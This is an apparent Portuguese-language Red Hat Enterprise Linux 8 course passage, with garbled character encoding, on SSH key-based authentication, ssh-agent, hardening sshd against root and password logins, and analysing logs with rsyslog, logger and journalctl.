Se voc√™ n√£o especificar uma senha quando ssh-keygen solicitar, a chave privada gerada n√£o estar√° protegida. Nesse caso, qualquer pessoa com o arquivo de chave privada poder√° us√°-lo para autentica√ß√£o. Se voc√™ definir uma senha, precisar√° digit√°-la ao usar a chave privada para autentica√ß√£o. (Portanto, voc√™ estaria usando a senha da chave privada, em vez da senha no host remoto para autenticar.)
Voc√™ pode executar um programa auxiliar chamado ssh-agent que pode armazenar temporariamente em cache a sua senha de chave privada na mem√≥ria no in√≠cio da sua sess√£o para obter uma verdadeira autentica√ß√£o sem senha. Isso ser√° discutido mais adiante nesta se√ß√£o.
O exemplo a seguir do comando ssh-keygen mostra a cria√ß√£o da chave privada protegida por senha junto com a chave p√∫blica.
[user@host ~]$ ssh-keygen -f .ssh/key-with-pass Generating public/private rsa key pair. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in .ssh/key-with-pass. Your public key has been saved in .ssh/key-with-pass.pub. The key fingerprint is: SHA256:w3GGB7EyHUry4aOcNPKmhNKS7dl1YsMVLvFZJ77VxAo user@host.lab.example.com The key&amp;rsquo;s randomart image is: &#43;&amp;mdash;[RSA 2048]&amp;mdash;-&#43; | . &#43; =.o &amp;hellip; | | = B XEo o. | | . o O X =&amp;hellip;. | | = = = B = o. | |= &#43; * * S . | |.&#43; = o &#43; . | | &#43; . | | | | | &#43;&amp;mdash;-[SHA256]&amp;mdash;&amp;ndash;&#43;
A op√ß√£o -f com o comando ssh-keygen determina os arquivos onde as chaves s√£o salvas. No exemplo anterior, as chaves privada e p√∫blica s√£o salvas nos arquivos /home/user/.ssh/key-with-pass /home/user/.ssh/key-with-pass.pub, respectivamente. Aten√ß√£o
Durante a gera√ß√£o adicional do par de chaves SSH, a menos que voc√™ especifique um nome de arquivo exclusivo, ser√° solicitada permiss√£o para substituir os arquivos id_rsa e id_rsa.pub existentes. Se voc√™ substituir os arquivos id_rsa e id_rsa.pub existentes, voc√™ deve substituir a chave p√∫blica antiga pela nova em todos os servidores SSH que tenham sua chave p√∫blica antiga.
Depois que as chaves SSH tiverem sido geradas, elas ser√£o armazenadas por padr√£o no diret√≥rio .ssh/ do diret√≥rio pessoal do usu√°rio. Os modos de permiss√£o devem ser 600 em sua chave privada e 644 em sua chave p√∫blica.
Compartilhamento da chave p√∫blica
Antes que a autentica√ß√£o baseada em chave possa ser usada, a chave p√∫blica precisa ser copiada para o sistema de destino. O comando ssh-copy-id copia a chave p√∫blica do par de chaves SSH para o sistema de destino. Se voc√™ omitir o caminho para o arquivo de chave p√∫blica durante a execu√ß√£o de ssh-copy-id, ela usa o arquivo /home/user/.ssh/id_rsa.pub padr√£o.
[user@host ~]$ ssh-copy-id -i .ssh/key-with-pass.pub user@remotehost /usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &amp;ldquo;/home/user/.ssh/id_rsa.pub&amp;rdquo; /usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed /usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed &amp;ndash; if you are prompted now it is to install the new keys user@remotehost&amp;rsquo;s password: redhat Number of key(s) added: 1
Now try logging into the machine, with: &amp;ldquo;ssh &amp;lsquo;user@remotehost&amp;rsquo;&amp;rdquo; and check to make sure that only the key(s) you wanted were added.
Depois que a chave p√∫blica √© transferida com √™xito para um sistema remoto, voc√™ pode autenticar para um sistema remoto usando a chave privada correspondente ao fazer login no sistema remoto via SSH. Se voc√™ omitir o caminho para o arquivo de chave privada durante a execu√ß√£o do comando ssh, ela usar√° o arquivo /home/user/.ssh/id_rsa padr√£o.
[user@host ~]$ ssh -i .ssh/key-with-pass user@remotehost Enter passphrase for key &amp;lsquo;.ssh/key-with-pass&amp;rsquo;: redhatpass &amp;hellip;output omitted&amp;hellip; [user@remotehost ~]$ exit logout Connection to remotehost closed. [user@host ~]$
Uso do ssh-agent para autentica√ß√£o n√£o interativa
Se a chave privada SSH estiver protegida com uma senha, voc√™ normalmente ter√° que digitar a senha para usar a chave privada para autentica√ß√£o. No entanto, voc√™ pode usar um programa chamado ssh-agent para armazenar em cache temporariamente a senha na mem√≥ria. Ent√£o, sempre que voc√™ usar SSH para fazer login em outro sistema com a chave privada, ssh-agent fornecer√° automaticamente a senha para voc√™. Isso √© conveniente e pode melhorar a seguran√ßa, oferecendo menos oportunidades para algu√©m olhar por cima do seu ombro e ver voc√™ digitar a senha.
Dependendo da configura√ß√£o do seu sistema local, se voc√™ inicialmente fazer login no ambiente de √°rea de trabalho gr√°fica do GNOME, o programa ssh-agent poder√° ser iniciado e configurado automaticamente para voc√™.
Se voc√™ fazer login em um console de texto, fa√ßa o login usando ssh, ou use sudo ou su. Provavelmente, ser√° necess√°rio iniciar ssh-agent manualmente para essa sess√£o. Voc√™ pode fazer isso com o seguinte comando:
[user@host ~]$ eval $(ssh-agent) Agent pid 10155 [user@host ~]$
Nota
Quando voc√™ executa ssh-agent, ele imprime alguns comandos do shell. Voc√™ precisa executar esses comandos para definir vari√°veis de ambiente usadas por programas como ssh-add para se comunicar com ele. O comando eval $(ssh-agent) inicia ssh-agent e executa esses comandos para definir automaticamente essas vari√°veis de ambiente para essa sess√£o do shell. Ele tamb√©m exibe a PID do processo ssh-agent.
Quando ssh-agent est√° em execu√ß√£o, voc√™ precisa informar a senha da(s) chave(s) privada(s). Voc√™ pode fazer isso com o comando ssh-add.
Os comandos ssh-add a seguir adicionam as chaves privadas de /home/user/.ssh/id_rsa (o padr√£o) e arquivos /home/user/.ssh/key-with-pass, respectivamente.
[user@host ~]$ ssh-add Identity added: /home/user/.ssh/id_rsa (user@host.lab.example.com) [user@host ~]$ ssh-add .ssh/key-with-pass Enter passphrase for .ssh/key-with-pass: redhatpass Identity added: .ssh/key-with-pass (user@host.lab.example.com)
Depois de adicionar com sucesso as chaves privadas ao processo ssh-agent, voc√™ pode invocar uma conex√£o por SSH usando o comando ssh. Se voc√™ estiver usando qualquer arquivo de chave privada diferente do arquivo /home/user/.ssh/id_rsa padr√£o, voc√™ deve usar a op√ß√£o -i com o comando ssh para especificar o caminho para o arquivo de chave privada.
O exemplo a seguir do comando ssh usa o arquivo de chave privada padr√£o para autenticar em um servidor SSH.
[user@host ~]$ ssh user@remotehost Last login: Fri Apr 5 10:53:50 2019 from host.example.com [user@remotehost ~]$
O exemplo a seguir do comando ssh usa o arquivo de chave privada (n√£o padr√£o) /home/user/.ssh/key-with-pass para autenticar em um servidor SSH. A chave privada no exemplo a seguir j√° foi descriptografada e adicionada ao seu processo pai ssh-agent, portanto, o comando ssh n√£o solicita que voc√™ descriptografe a chave privada digitando interativamente sua senha.
[user@host ~]$ ssh -i .ssh/key-with-pass user@remotehost Last login: Mon Apr 8 09:44:20 2019 from host.example.com [user@remotehost ~]$
Quando voc√™ fizer o logout da sess√£o que iniciou ssh-agent, o processo ser√° encerrado e as senhas das chaves privadas ser√£o apagadas da mem√≥ria.
Personaliza√ß√£o da configura√ß√£o do servi√ßo OpeSSH Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de restringir logins diretos como root e desativar a autentica√ß√£o baseada em senha para o servi√ßo OpenSSH. Configura√ß√£o do servidor OpenSSH
O servi√ßo OpenSSH √© fornecido por um daemon chamado sshd. O arquivo de configura√ß√£o principal √© /etc/ssh/sshd_config.
A configura√ß√£o padr√£o do servidor OpenSSH funciona bem. No entanto, voc√™ pode fazer algumas altera√ß√µes para fortalecer a seguran√ßa do seu sistema. Existem duas mudan√ßas comuns que voc√™ pode fazer. Voc√™ pode proibir o login remoto direto para a conta root e pode proibir autentica√ß√£o baseada em senha (em favor da autentica√ß√£o de chave privada SSH). Proibi√ß√£o do superusu√°rio de fazer login usando SSH
√â uma boa pr√°tica proibir o login direto na conta de usu√°rio root de sistemas remotos. Alguns dos riscos de permitir login direto como root incluem:
O nome de usu√°rio root existe em cada sistema Linux por padr√£o. Assim, um invasor em potencial precisa apenas adivinhar a senha, ao inv√©s de uma combina√ß√£o de nome de usu√°rio e senha v√°lidos. Isso reduz a complexidade de um invasor. O usu√°rio root tem privil√©gios irrestritos, portanto, seu comprometimento pode levar a danos m√°ximos ao sistema. Do ponto de vista da auditoria, pode ser dif√≠cil rastrear qual usu√°rio autorizado fez login como root e fez altera√ß√µes. Se os usu√°rios tiverem que fazer o login como um usu√°rio comum e mudar para a conta root, isso gera um evento de log que pode ser usado para ajudar a fornecer responsabilidade. O servidor OpenSSH usa defini√ß√£o da configura√ß√£o PermitRootLogin no arquivo de configura√ß√£o /etc/ssh/sshd_config para permitir ou proibir usu√°rios de fazer login no sistema root.
PermitRootLogin yes
Com o par√¢metro PermitRootLogin definido como sim, como √© padr√£o, as pessoas t√™m permiss√£o para fazer login como root. Para evitar isso, defina o valor como n√£o. Como alternativa, para evitar a autentica√ß√£o baseada em senha, mas permitir autentica√ß√£o baseada em chave privada para root, defina o par√¢metro PermitRootLogin como without-password.
O servidor SSH (sshd) deve ser carregado novamente para que as altera√ß√µes entrem em vigor.
[root@host ~]# systemctl reload sshd
Proibi√ß√£o da autentica√ß√£o baseada em senha para SSH
Permitir somente logins baseados em chave privada √† linha de comando remoto tem v√°rias vantagens:
Os invasores n√£o podem usar ataques de adivinha√ß√£o de senha para invadir contas remotas no sistema. Com chaves privadas protegidas por senha, um invasor precisa da senha e de uma c√≥pia da chave privada. Com senhas, um invasor precisa apenas da senha. Usando chaves privadas protegidas por senha em conjunto com ssh-agent, a senha √© exposta com menos frequ√™ncia, pois ela √© inserida com menos frequ√™ncia e o login √© mais conveniente para o usu√°rio. O servidor OpenSSH usa o par√¢metro PasswordAuthentication no arquivo de configura√ß√£o /etc/ssh/sshd_config para controlar se os usu√°rios podem usar a autentica√ß√£o baseada em senha ao fazer login no sistema.
PasswordAuthentication yes
O valor padr√£o sim para o par√¢metro PasswordAuthentication no arquivo de configura√ß√£o /etc/ssh/sshd_config faz com que o servidor SSH permita que os usu√°rios usem a autentica√ß√£o baseada em senha ao fazer login. O valor n√£o para PasswordAuthentication impede que os usu√°rios usem a autentica√ß√£o baseada em senha.
Tenha em mente que sempre que voc√™ alterar o arquivo /etc/ssh/sshd_config, ser√° necess√°rio recarregar o servi√ßo sshd para que as altera√ß√µes entrem em vigor. Importante
Se voc√™ desativar a autentica√ß√£o baseada em senha para ssh, dever√° ter uma maneira de garantir que o arquivo ~/.ssh/authorized_keys do usu√°rio no servidor remoto seja preenchido com sua chave p√∫blica, para que eles possam fazer login.
Cap√≠tulo 11. An√°lise e armazenamento de logs Descri√ß√£o da arquitetura de log do sistema Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de descrever a arquitetura b√°sica de registro em log usada pelo Red Hat Enterprise Linux para registrar eventos. Registro em log do sistema
Os processos e o kernel do sistema operacional registram em log os eventos que ocorrem. Esses logs s√£o usados para a auditoria do sistema e para a solu√ß√£o de problemas.
Muitos sistemas registram logs de eventos em arquivos de texto que s√£o mantidos no diret√≥rio /var/log. Esses logs podem ser inspecionados usando utilit√°rios de texto normais, como less e tail.
Um sistema de registro em log padr√£o com base no protocolo Syslog √© integrado ao Red Hat Enterprise Linux. Muitos programas usam esse sistema para registrar eventos e organiz√°-los em arquivos de log. Os servi√ßos systemd-journald e rsyslog controlam as mensagens do syslog no Red Hat Enterprise Linux 8.
O servi√ßo systemd-journald est√° no centro da arquitetura de log de eventos do sistema operacional. Ele coleta mensagens de eventos de v√°rias fontes, incluindo o kernel, a sa√≠da dos est√°gios iniciais do processo de boot, a sa√≠da padr√£o e o erro padr√£o dos daemons quando eles s√£o inicializados e executados, al√©m dos eventos do syslog. Em seguida, ele os reestrutura em um formato padr√£o e os grava em um di√°rio estruturado e indexado do sistema. Por padr√£o, esse di√°rio √© armazenado em um sistema de arquivos que n√£o persiste nas reinicializa√ß√µes.
No entanto, o servi√ßo rsyslog l√™ mensagens do syslog recebidas por systemd-journald do di√°rio quando eles chegam. Em seguida, ele processa os eventos syslog, registrando-os em seus arquivos de log ou encaminhando-os para outros servi√ßos de acordo com sua pr√≥pria configura√ß√£o.
O servi√ßo rsyslog classifica e grava as mensagens do syslog nos arquivos de log que persistem em reinicializa√ß√µes em /var/log. O servi√ßo rsyslog classifica as mensagens de log para arquivos de log espec√≠ficos com base no tipo de programa que enviou cada mensagem, ou facility, e a prioridade de cada mensagem do syslog.
Al√©m dos arquivos de mensagens do syslog, o diret√≥rio /var/log cont√©m arquivos de log de outros servi√ßos no sistema. A tabela a seguir lista alguns arquivos √∫teis no diret√≥rio /var/log.
Tabela 11.1. Arquivos de log do sistema selecionados
log_a1.png
Nota Alguns aplicativos n√£o usam o syslog para gerenciar suas mensagens de log, embora, normalmente, eles salvem seus arquivos de log em um subdiret√≥rio de /var/log. Por exemplo, o servidor web Apache salva as mensagens de log em arquivos de um subdiret√≥rio do diret√≥rio /var/log.
An√°lise dos arquivos do syslog Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de interpretar eventos nos arquivos do syslog relevantes para solucionar problemas ou revisar o status do sistema. Registro de eventos no sistema
V√°rios programas usam o protocolo syslog para registrar eventos no sistema. Cada mensagem de log √© categorizada por um recurso (o tipo de mensagem) e uma prioridade (a gravidade da mensagem). Os recursos dispon√≠veis est√£o documentados na p√°gina do man rsyslog.conf(5).
A tabela a seguir lista as oito prioridades padr√£o do syslog da mais alta √† mais baixa.
Tabela 11.2. Vis√£o geral das prioridades do syslog
syslog_a1.png
O servi√ßo rsyslog usa o recurso e a prioridade das mensagens de log para determinar como lidar com elas. Ele √© configurado por regras no arquivo /etc/rsyslog.conf e qualquer arquivo no diret√≥rio /etc/rsyslog.d que tem uma extens√£o de nome de arquivo .conf. Os pacotes de software podem facilmente adicionar regras instalando um arquivo apropriado no diret√≥rio /etc/rsyslog.d.
Cada regra que controla como classificar mensagens de syslog √© uma linha em um dos arquivos de configura√ß√£o. O lado esquerdo de cada linha indica os recursos e a gravidade das mensagens de syslog que correspondem √† regra. O lado direito de cada linha indica o arquivo onde a mensagem de log ser√° salva (ou onde entregar a mensagem). Um asterisco (*) √© um curinga que corresponde a todos os valores.
Por exemplo, a seguinte linha registraria mensagens enviadas para o recurso authpriv em qualquer prioridade no arquivo /var/log/secure:
authpriv.* /var/log/secure
√Äs vezes, as mensagens de log correspondem a mais de uma regra em rsyslog.conf. Nesses casos, uma mensagem √© armazenada em mais de um arquivo de log. Para limitar o n√∫mero de mensagens armazenadas, a palavra-chave none no campo de prioridade indica que nenhuma mensagem para o recurso indicado deve ser armazenada em um determinado arquivo.
Em vez de registrar as mensagens do syslog em um arquivo, elas tamb√©m podem ser impressas nos terminais de todos os usu√°rios conectados. O arquivo rsyslog.conf tem uma configura√ß√£o para imprimir todas as mensagens do syslog com a prioridade emerg nos terminais de todos os usu√°rios conectados. Exemplos de regras do rsyslog
RULES Log all kernel messages to the console. Logging much else clutters up the screen. #kern.* /dev/console
Log anything (except mail) of level info or higher. Don&amp;rsquo;t log private authentication messages! *.info;mail.none;authpriv.none;cron.none /var/log/messages
The authpriv file has restricted access. authpriv.* /var/log/secure
Log all the mail messages in one place. mail.* -/var/log/maillog
Log cron stuff cron.* /var/log/cron
Everybody gets emergency messages .emerg :omusrmsg:
Save news errors of level crit and higher in a special file. uucp,news.crit /var/log/spooler
Save boot messages also to boot.log local7.* /var/log/boot.log
Nota
O subsistema syslog tem muito mais recursos al√©m do escopo deste curso. Quem desejar saber mais, pode consultar a p√°gina do man rsyslog.conf(5) e a vasta documenta√ß√£o HTML em /usr/share/doc/rsyslog/html/index.html inclu√≠da no pacote rsyslog-doc, que est√° dispon√≠vel no reposit√≥rio AppStream no Red Hat Enterprise Linux 8. Rod√≠zio de arquivos de log
A ferramenta logrotate faz o rod√≠zio dos arquivos de log para evitar que eles ocupem muito espa√ßo no sistema de arquivos que cont√©m o diret√≥rio /var/log. Quando ocorre o rod√≠zio de um arquivo de log, ele √© renomeado com uma extens√£o que indica a data do rod√≠zio. Por exemplo, o arquivo /var/log/messages antigo poder√° se tornar /var/log/messages-20190130 se o rod√≠zio ocorrer em 30/01/2019. Depois que o arquivo de log antigo sofrer rod√≠zio, um novo arquivo de log ser√° criado, e o servi√ßo que escreve nele ser√° notificado.
Ap√≥s um determinado n√∫mero de rod√≠zios (geralmente ap√≥s quatro semanas), o arquivo de log mais antigo √© descartado para liberar espa√ßo em disco. Uma tarefa agendada executa o programa logrotate diariamente para verificar se algum log precisa sofrer rod√≠zio. A maioria dos arquivos de log sofrem rod√≠zio semanalmente, mas o logrotate faz o rod√≠zio de alguns de maneira mais r√°pida ou mais lenta ou quando atingem um determinado tamanho.
A configura√ß√£o do logrotate n√£o √© abordada neste curso. Para obter mais informa√ß√µes, consulte a p√°gina do man logrotate(8). An√°lise de uma entrada do syslog
As mensagens de log iniciam com a mensagem mais antiga no topo e as mensagens mais recentes no final do arquivo de log. O servi√ßo rsyslog usa um formato padr√£o ao gravar entradas em arquivos de log. O exemplo a seguir explica a anatomia de uma mensagem de log no arquivo de log /var/log/secure.
logs_a2.png
Monitoramento de logs
Monitorar um ou mais arquivos de log de eventos √© importante para reproduzir problemas e quest√µes. O comando tail -f /path/to/file exibe as √∫ltimas 10 linhas do arquivo especificado e continua a mostrar as novas linhas do arquivo conforme s√£o gravadas.
Por exemplo, para monitorar as tentativas de login com falha, execute o comando tail em um terminal e, em outro terminal, execute o comando ssh com o usu√°rio root enquanto um usu√°rio tenta fazer login no sistema.
No primeiro terminal, execute o seguinte comando tail:
[root@host ~]# tail -f /var/log/secure
No segundo terminal, execute o seguinte comando ssh:
[root@host ~]# ssh root@localhost root@localhost&amp;rsquo;s password: redhat &amp;hellip;output omitted&amp;hellip; [root@host ~]#
Volte para o primeiro terminal e visualize os logs.
&amp;hellip;output omitted&amp;hellip; Feb 10 09:01:13 host sshd[2712]: Accepted password for root from 172.25.254.254 port 56801 ssh2 Feb 10 09:01:13 host sshd[2712]: pam_unix(sshd:session): session opened for user root by (uid=0)
Envio manual de mensagens do syslog
O comando logger pode enviar mensagens para o servi√ßo do rsyslog. Por padr√£o, ele envia a mensagem para o recurso user com a prioridade notice (user.notice), a menos que especificado de outra forma com a op√ß√£o -p. Ele √© √∫til para testar as altera√ß√µes na configura√ß√£o do servi√ßo rsyslog.
Para enviar uma mensagem para o servi√ßo rsyslog que fique gravada no arquivo de log /var/log/boot.log, execute o seguinte comando logger:
[root@host ~]# logger -p local7.notice &amp;ldquo;Log entry created on host&amp;rdquo;
An√°lise das entradas do di√°rio do sistema Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de localizar e interpretar entradas de log no di√°rio do sistema para solucionar problemas ou revisar o status do sistema. Localiza√ß√£o de eventos
O servi√ßo systemd-journald armazena dados de registro em um arquivo bin√°rio estruturado e indexado, denominado di√°rio. Esses dados incluem informa√ß√µes adicionais sobre o evento de log. Por exemplo, para eventos do syslog, isso inclui o recurso e a prioridade da mensagem original. Importante
No Red Hat Enterprise Linux 8, o diret√≥rio /run/log armazena o di√°rio do sistema por padr√£o. O conte√∫do do diret√≥rio /run/log √© limpo ap√≥s a reinicializa√ß√£o. Voc√™ pode alterar essa configura√ß√£o e aprender√° a fazer isso neste cap√≠tulo.
Para recuperar mensagens de log do di√°rio, use o comando journalctl. Voc√™ pode usar esse comando para visualizar todas as mensagens no di√°rio ou para procurar eventos espec√≠ficos com base em uma ampla variedade de op√ß√µes e crit√©rios. Se voc√™ executar o comando como root, ter√° acesso total ao di√°rio. Os usu√°rios regulares tamb√©m podem usar esse comando, mas podem ser impedidos de ver certas mensagens.
[root@host ~]# journalctl &amp;hellip;output omitted&amp;hellip; Feb 21 17:46:25 host.lab.example.com systemd[24263]: Stopped target Sockets. Feb 21 17:46:25 host.lab.example.com systemd[24263]: Closed D-Bus User Message Bus Socket. Feb 21 17:46:25 host.lab.example.com systemd[24263]: Closed Multimedia System. Feb 21 17:46:25 host.lab.example.com systemd[24263]: Reached target Shutdown. Feb 21 17:46:25 host.lab.example.com systemd[24263]: Starting Exit the Session&amp;hellip; Feb 21 17:46:25 host.lab.example.com systemd[24268]: pam_unix(systemd-user:session): session c&amp;gt; Feb 21 17:46:25 host.lab.example.com systemd[1]: Stopped User Manager for UID 1001. Feb 21 17:46:25 host.lab.example.com systemd[1]: user-runtime-dir@1001.service: Unit not neede&amp;gt; Feb 21 17:46:25 host.lab.example.com systemd[1]: Stopping /run/user/1001 mount wrapper&amp;hellip; Feb 21 17:46:25 host.lab.example.com systemd[1]: Removed slice User Slice of UID 1001. Feb 21 17:46:25 host.lab.example.com systemd[1]: Stopped /run/user/1001 mount wrapper. Feb 21 17:46:36 host.lab.example.com sshd[24434]: Accepted publickey for root from 172.25.250.&amp;gt; Feb 21 17:46:37 host.lab.example.com systemd[1]: Started Session 20 of user root. Feb 21 17:46:37 host.lab.example.com systemd-logind[708]: New session 20 of user root. Feb 21 17:46:37 host.lab.example.com sshd[24434]: pam_unix(sshd:session): session opened for u&amp;gt; Feb 21 18:01:01 host.lab.example.com CROND[24468]: (root) CMD (run-parts /etc/cron.hourly) Feb 21 18:01:01 host.lab.example.com run-parts[24471]: (/etc/cron.hourly) starting 0anacron Feb 21 18:01:01 host.lab.example.com run-parts[24477]: (/etc/cron.hourly) finished 0anacron lines 1464-1487/1487 (END) q
O comando journalctl real√ßa as mensagens de log importantes: as mensagens com prioridade notice ou warning est√£o em negrito e as mensagens com prioridade error ou superior est√£o escritas em vermelho.
A chave para usar o di√°rio para solu√ß√£o de problemas e auditoria √© limitar as pesquisas do di√°rio para que mostrem somente os resultados relevantes.
Por padr√£o, journalctl -n mostra pelo menos 10 entradas de log. Voc√™ pode ajustar isso com um argumento opcional que especifica quantas entradas de log devem ser exibidas. Para as √∫ltimas cinco entradas de log, execute o seguinte comando journalctl:
[root@host ~]# journalctl -n 5 &amp;ndash; Logs begin at Wed 2019-02-20 16:01:17 &#43;07, end at Thu 2019-02-21 18:01:01 &#43;07. &amp;ndash; &amp;hellip;output omitted&amp;hellip; Feb 21 17:46:37 host.lab.example.com systemd-logind[708]: New session 20 of user root. Feb 21 17:46:37 host.lab.example.com sshd[24434]: pam_unix(sshd:session): session opened for u&amp;gt; Feb 21 18:01:01 host.lab.example.com CROND[24468]: (root) CMD (run-parts /etc/cron.hourly) Feb 21 18:01:01 host.lab.example.com run-parts[24471]: (/etc/cron.hourly) starting 0anacron Feb 21 18:01:01 host.lab.example.com run-parts[24477]: (/etc/cron.hourly) finished 0anacron lines 1-6/6 (END) q
De maneira semelhante ao comando tail -f, o comando journalctl -f exibe as √∫ltimas 10 linhas do di√°rio e continua a mostrar resultados de novas entradas conforme s√£o gravadas no di√°rio. Para sair do processo journalctl -f, use a combina√ß√£o de teclas Ctrl&#43;C.
[root@host ~]# journalctl -f &amp;ndash; Logs begin at Wed 2019-02-20 16:01:17 &#43;07. &amp;ndash; &amp;hellip;output omitted&amp;hellip; Feb 21 18:01:01 host.lab.example.com run-parts[24477]: (/etc/cron.hourly) finished 0anacron Feb 21 18:22:42 host.lab.example.com sshd[24437]: Received disconnect from 172.25.250.250 port 48710:11: disconnected by user Feb 21 18:22:42 host.lab.example.com sshd[24437]: Disconnected from user root 172.25.250.250 port 48710 Feb 21 18:22:42 host.lab.example.com sshd[24434]: pam_unix(sshd:session): session closed for user root Feb 21 18:22:42 host.lab.example.com systemd-logind[708]: Session 20 logged out. Waiting for processes to exit. Feb 21 18:22:42 host.lab.example.com systemd-logind[708]: Removed session 20. Feb 21 18:22:43 host.lab.example.com sshd[24499]: Accepted publickey for root from 172.25.250.250 port 48714 ssh2: RSA SHA256:1UGybTe52L2jzEJa1HLVKn9QUCKrTv3ZzxnMJol1Fro Feb 21 18:22:44 host.lab.example.com systemd-logind[708]: New session 21 of user root. Feb 21 18:22:44 host.lab.example.com systemd[1]: Started Session 21 of user root. Feb 21 18:22:44 host.lab.example.com sshd[24499]: pam_unix(sshd:session): session opened for user root by (uid=0) ^C [root@host ~]#
Para solucionar problemas, √© √∫til filtrar a sa√≠da do di√°rio por prioridade das entradas do di√°rio. O journalctl -p seleciona o nome ou o n√∫mero de um n√≠vel de prioridade e exibe as entradas do di√°rio para entradas com essa prioridade e superiores. O comando journalctl reconhece os n√≠veis de prioridade debug, info, notice, warning, err, crit, alert e emerg.
Execute o seguinte comando journalctl para listar entradas do di√°rio com prioridade err ou superior:
[root@host ~]# journalctl -p err &amp;ndash; Logs begin at Wed 2019-02-20 16:01:17 &#43;07, end at Thu 2019-02-21 18:01:01 &#43;07. &amp;ndash; ..output omitted&amp;hellip; Feb 20 16:01:17 host.lab.example.com kernel: Detected CPU family 6 model 13 stepping 3 Feb 20 16:01:17 host.lab.example.com kernel: Warning: Intel Processor - this hardware has not undergone testing by Red Hat and might not be certif&amp;gt; Feb 20 16:01:20 host.lab.example.com smartd[669]: DEVICESCAN failed: glob(3) aborted matching pattern /dev/discs/disc* Feb 20 16:01:20 host.lab.example.com smartd[669]: In the system&amp;rsquo;s table of devices NO devices found to scan lines 1-5/5 (END) q
Ao procurar por eventos espec√≠ficos, voc√™ pode limitar os resultados a um determinado per√≠odo de tempo. O comando journalctl tem duas op√ß√µes para limitar os resultados a um per√≠odo de tempo espec√≠fico: as op√ß√µes &amp;ndash;since e &amp;ndash;until. As duas op√ß√µes usam um argumento de tempo no formato &amp;ldquo;AAAA-MM-DD hh:mm:ss&amp;rdquo; (as aspas duplas s√£o necess√°rias para manter o espa√ßo na op√ß√£o). Se a data for omitida, o comando presumir√° a data atual; se o tempo for omitido, ele presumir√° que o per√≠odo √© todo o dia, com in√≠cio √†s 00:00:00. As duas op√ß√µes utilizam yesterday, today e tomorrow como argumentos v√°lidos, al√©m do campo de data e hora.
Execute o comando journalctl a seguir para listar todas as entradas de di√°rio dos registros de hoje.
[root@host ~]# journalctl &amp;ndash;since today &amp;ndash; Logs begin at Wed 2019-02-20 16:01:17 &#43;07, end at Thu 2019-02-21 18:31:14 &#43;07. &amp;ndash; &amp;hellip;output omitted&amp;hellip; Feb 21 18:22:44 host.lab.example.com systemd-logind[708]: New session 21 of user root. Feb 21 18:22:44 host.lab.example.com systemd[1]: Started Session 21 of user root. Feb 21 18:22:44 host.lab.example.com sshd[24499]: pam_unix(sshd:session): session opened for user root by (uid=0) Feb 21 18:31:13 host.lab.example.com systemd[1]: Starting dnf makecache&amp;hellip; Feb 21 18:31:14 host.lab.example.com dnf[24533]: Red Hat Enterprise Linux 8.0 AppStream (dvd) 637 kB/s | 2.8 kB 00:00 Feb 21 18:31:14 host.lab.example.com dnf[24533]: Red Hat Enterprise Linux 8.0 BaseOS (dvd) 795 kB/s | 2.7 kB 00:00 Feb 21 18:31:14 host.lab.example.com dnf[24533]: Metadata cache created. Feb 21 18:31:14 host.lab.example.com systemd[1]: Started dnf makecache. lines 533-569/569 (END) q
Execute o comando journalctl a seguir para listar todas as entradas de di√°rio de 2019-02-10 20:30:00 a 2019-02-13 12:00:00.
[root@host ~]# journalctl &amp;ndash;since &amp;ldquo;2019-02-10 20:30:00&amp;rdquo; &amp;ndash;until &amp;ldquo;2019-02-13 12:00:00&amp;rdquo; &amp;hellip;output omitted&amp;hellip;
Voc√™ tamb√©m pode especificar todas as entradas desde um tempo relativo at√© o presente. Por exemplo, para especificar todas as entradas na √∫ltima hora, voc√™ pode usar o seguinte comando:
[root@host ~]# journalctl &amp;ndash;since &amp;ldquo;-1 hour&amp;rdquo; &amp;hellip;output omitted&amp;hellip;
Nota
Voc√™ pode usar outras especifica√ß√µes de tempo mais sofisticadas com as op√ß√µes &amp;ndash;since e &amp;ndash;until. Para alguns exemplos, veja a p√°gina do man systemd.time(7).
Al√©m do conte√∫do vis√≠vel do di√°rio, existem campos conectados √†s entradas de log que s√≥ podem ser exibidos quando a op√ß√£o de resultado detalhado est√° ativada. Qualquer campo adicional pode ser usado para filtrar o resultado de uma consulta ao di√°rio. Isso √© recomendado para reduzir o resultado das pesquisas de determinados eventos complexos no di√°rio.
[root@host ~]# journalctl -o verbose &amp;ndash; Logs begin at Wed 2019-02-20 16:01:17 &#43;07, end at Thu 2019-02-21 18:31:14 &#43;07. &amp;ndash; &amp;hellip;output omitted&amp;hellip; Thu 2019-02-21 18:31:14.509128 &#43;07&amp;hellip; PRIORITY=6 _BOOT_ID=4409bbf54680496d94e090de9e4a9e23 _MACHINE_ID=73ab164e278e48be9bf80e80714a8cd5 SYSLOG_FACILITY=3 SYSLOG_IDENTIFIER=systemd _UID=0 _GID=0 CODE_FILE=../src/core/job.c CODE_LINE=826 CODE_FUNC=job_log_status_message JOB_TYPE=start JOB_RESULT=done MESSAGE_ID=39f53479d3a045ac8e11786248231fbf _TRANSPORT=journal _PID=1 _COMM=systemd _EXE=/usr/lib/systemd/systemd _CMDLINE=/usr/lib/systemd/systemd &amp;ndash;switched-root &amp;ndash;system &amp;ndash;deserialize 18 _CAP_EFFECTIVE=3fffffffff _SELINUX_CONTEXT=system_u:system_r:init_t:s0 _SYSTEMD_CGROUP=/init.scope _SYSTEMD_UNIT=init.scope _SYSTEMD_SLICE=-.slice UNIT=dnf-makecache.service MESSAGE=Started dnf makecache. _HOSTNAME=host.lab.example.com INVOCATION_ID=d6f90184663f4309835a3e8ab647cb0e _SOURCE_REALTIME_TIMESTAMP=1550748674509128 lines 32239-32275/32275 (END) q
A lista a seguir fornece os campos comuns do di√°rio do sistema que podem ser usados para procurar linhas relevantes para um processo ou evento espec√≠fico.
